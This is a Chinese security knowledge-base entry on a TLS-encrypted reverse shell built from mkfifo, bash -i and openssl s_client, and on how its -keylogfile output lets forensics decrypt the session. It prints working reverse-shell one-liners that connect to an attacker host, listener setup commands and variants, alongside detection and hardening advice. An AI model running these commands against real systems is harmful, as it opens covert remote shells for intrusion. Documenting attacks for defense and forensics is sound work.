---
id: web-java-rce-openssl-s-client-keylogfile-encrypted-revshell
title: OpenSSL s_client + FIFO 加密反弹 Shell：-keylogfile 留痕可还原 TLS 命令
type: scenario
domain: web
path: web/java/rce
technique: openssl-s-client-keylogfile-encrypted-revshell
aliases:
- openssl s_client 反弹 shell
- FIFO 加密反弹 Shell
- -keylogfile 流量解密
- TLS 加密交互 Shell
- mkfifo openssl s_client
tags:
- rce
- revshell
- openssl
- tls
- keylogfile
- fifo
- linux
- webshell
cve: []
severity: high
confidence: high
status: draft
created: '2026-11-07'
updated: '2026-11-07'
---

## 一句话结论

在目标 Linux 上用 `mkfifo` 建一个 FIFO，把 `bash -i` 的标准输入接到 FIFO、输出通过管道送给 `openssl s_client -quiet -connect <attacker>:<port> -keylogfile key.log`，再把 `s_client` 的明文输出重定向回 FIFO，就能得到一个走 TLS 的交互式反弹 Shell；`-keylogfile` 会把 TLS 会话密钥写到目标磁盘，取证方拿到 `key.log` 后可在 Wireshark 中解密整段命令流量。

## 原理

- 命令形态（文中流量还原）：
  ```bash
  mkfifo /tmp/revshell; /bin/bash -i < /tmp/revshell 2>&1 | openssl s_client -quiet -connect 192.168.31.190:2024 -keylogfile key.log > /tmp/revshell; rm -f /tmp/revshell
  ```
  各部分的配合关系：
  - `mkfifo /tmp/revshell` 建一个命名管道；`bash -i < /tmp/revshell` 让交互式 bash 从管道读输入。
  - `bash` 的 stdout/stderr 通过管道送给 `openssl s_client`，由它加密后发往攻击者的 TLS 服务端。
  - `s_client` 从服务端收到的明文输出被重定向回 `/tmp/revshell`，成为 bash 的下一条输入，从而形成闭环。
- 整个链路对网络侧只呈现 TLS 流量，没有明文的 `bash`/命令关键字；`-quiet` 抑制 s_client 的会话横幅，减少噪声。
- `-keylogfile key.log` 是 OpenSSL 1.1.1+ 的选项，会按 NSS Key Log 格式把 `CLIENT_RANDOM <client_random> <master_secret>`（TLS 1.2）或 TLS 1.3 的流量密钥写入文件。Wireshark/tshark 配置 `(Pre)-Master-Secret log filename` 指向该文件即可解密对应会话，因此这个“加密 Shell”在主机侧留下了可解密的钥匙。
- 为什么可行：`s_client` 默认不校验证书链（除非显式 `-verify`），可以连自签名/无证书的 TLS 服务端；bash 的 `/dev/tcp` 与 FIFO 都是 Linux 自带能力，无需 nc/socat。`s_client` 退出后 `rm -f /tmp/revshell` 清理 FIFO，但 `key.log` 默认留在当前工作目录（文中在 root 的 home/工作目录下被发现）。

## 触发条件

- 目标为 Linux，具备 bash、`mkfifo` 与 OpenSSL 1.1.1+ 的 `s_client`；`-keylogfile` 需要较新版本，旧版本可退回不带该参数的 TLS 反弹 Shell。
- 目标可出站访问攻击者的 TCP 端口；攻击者需运行一个 TLS 服务端（如 `openssl s_server`）。
- 攻击者已通过 WebShell/RCE 能执行命令；命令通常在 WebShell 会话中执行，因此工作目录取决于容器/服务进程的 cwd。
- 若要从 pcap 还原命令，取证方需取得目标上的 `key.log`（或 TLS 私钥/其他解密材料）。

## 利用步骤

1. 在攻击机启动 TLS 监听（示例，自签名证书）：
   ```bash
   openssl req -x509 -newkey rsa:2048 -nodes -keyout srv.key -out srv.crt -days 1 -subj "/CN=c2"
   openssl s_server -quiet -accept 2024 -cert srv.crt -key srv.key
   ```
2. 在目标上通过 WebShell/命令执行写入并运行反弹命令：
   ```bash
   mkfifo /tmp/revshell
   /bin/bash -i < /tmp/revshell 2>&1 | openssl s_client -quiet -connect <attacker>:2024 -keylogfile key.log > /tmp/revshell
   rm -f /tmp/revshell
   ```
3. 攻击机侧出现交互式提示符后执行 `id`、`ls` 等命令确认 Shell；文中连接成功后执行的第一条命令是 `ls`。
4. 取证时在目标上查找 `key.log`（常见于执行命令时的 cwd、`/root`、`/tmp`、Web 目录），把文件内容导入 Wireshark：`Preferences → Protocols → TLS → (Pre)-Master-Secret log filename`，或 tshark `-o tls.keylog_file:key.log`。
5. 追踪对应 TLS 流（Follow → TLS Stream），还原攻击者的命令与输出；结合 bash 历史、进程树和 `/tmp/revshell` 残留确认执行时间线。
6. 清理时删除 FIFO、`key.log`、监听进程与相关进程；排查是否还有同入口的其他持久化。

## PoC

```bash
# 攻击机：TLS 监听端（自签名证书仅用于演示）
openssl req -x509 -newkey rsa:2048 -nodes -keyout srv.key -out srv.crt -days 1 -subj "/CN=c2"
openssl s_server -quiet -accept 2024 -cert srv.crt -key srv.key

# 目标：FIFO + bash + openssl s_client 加密反弹 Shell
mkfifo /tmp/revshell
/bin/bash -i < /tmp/revshell 2>&1 | openssl s_client -quiet -connect <attacker>:2024 -keylogfile key.log > /tmp/revshell
rm -f /tmp/revshell
```

```bash
# 取证：用 key.log 解密 pcap 中的 TLS 会话
tshark -r capture.pcap -o tls.keylog_file:key.log -Y "tls" -T fields -e tls.handshake.type
```

说明：PoC 由文中命令与 OpenSSL 通用用法整理，未在本地复现；`s_server` 未启用客户端证书校验，真实对抗中攻击者可能使用自己的 C2 服务端。

## 变体与关联

- 变体：不写 `key.log`（去掉 `-keylogfile`），网络侧仍只有 TLS，但取证方需私钥或 TLS 1.3 会话密钥才能解密；也可把 keylog 写到隐蔽路径或直接在内存中处理。
- 变体：用 `socat OPENSSL:<attacker>:<port>,verify=0`、`ncat --ssl`、`stunnel` 等替代 `s_client`；或使用 `openssl s_client -quiet -connect ... -ign_eof` 调整 EOF 行为。
- 变体：明文反弹 Shell（`bash -i >& /dev/tcp/...`）更简单但会被流量设备直接识别；TLS 版本主要规避明文命令检测，代价是引入证书/密钥材料。
- 关联：[[web-java-rce-runtime-exec-string-tokenizer-bash-revshell]]（Java `Runtime.exec(String)` 下的 bash 反弹 Shell 构造）、[[web-java-rce-socket-revshell-stream-pump]]（Java Socket 双向流泵反弹 Shell）、[[ctf-forensics-tls-keylog-pcap-decrypt]]（TLS keylog 的解密流程）、[[defense-forensics-godzilla-ekp-jsp-traffic-decode]]（同文章中的 WebShell 入口）。
- 边界：目标无 OpenSSL/版本过旧、出站 TCP 被阻断、TLS 服务端要求客户端证书而 s_client 未提供、`/tmp` 不可写或 noexec 时，链路不成立。

## 检测与防御

- 主机侧：监控 `mkfifo`、`openssl s_client`、`bash -i` 的组合进程链；检查 `/tmp` 下的 FIFO（`find /tmp -type p`）和 `key.log`；用 EDR 对“bash 子进程 + 出站 TLS”告警。
- 流量侧：识别非常规端口的 TLS 客户端流量、无 SNI 或固定自签名证书、长时间交互式小包；对 `s_client` 的默认 JA3/JA4 指纹做规则匹配。
- 取证：一旦发现 `key.log`，立即固定并与 pcap 一起离线解密；检查同一时段的所有 TLS 会话，还原命令与数据传输。
- 加固：限制出站访问与非常规端口；禁止 Web 进程执行 shell/openssl；使用最小权限容器；部署命令审计与进程白名单。
- 响应：终止反弹 Shell 与监听进程、删除 FIFO/key.log、修复入口漏洞并轮换凭据；排查同一入口的其他持久化。
